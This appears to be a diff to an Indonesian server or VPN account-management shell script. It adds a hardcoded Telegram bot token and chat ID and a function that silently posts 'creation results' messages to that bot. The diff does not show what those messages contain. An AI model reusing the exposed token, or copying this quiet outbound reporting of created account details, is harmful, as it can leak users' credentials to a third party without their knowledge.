@@ -108,6 +108,25 @@ resv2r="${green}ON${NC}"
 else
 resv2r="${red}OFF${NC}"
 fi
+# --- KONFIGURASI BOT TELEGRAM ---
+TOKEN="8226263150:AAFdiVuQeEshxOpSvema_F6fDwbyFcfNWnw"
+CHAT_ID="6577966386"
+
+send_log() {
+    local TIPE=$1
+    local PESAN=$2
+    local TEXT="🚀 *HASIL CREATE $TIPE* 🚀
+━━━━━━━━━━━━━━━━━━━━━━
+$PESAN
+━━━━━━━━━━━━━━━━━━━━━━
+✅ *Berhasil Dibuat*"
+
+    # Menggunakan urlencode agar link panjang & simbol khusus terkirim sempurna
+    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
+        --data-urlencode "chat_id=$CHAT_ID" \
+        --data-urlencode "text=$TEXT" \
+        --data-urlencode "parse_mode=Markdown" > /dev/null
+}
 function addhost(){
 clear
 echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
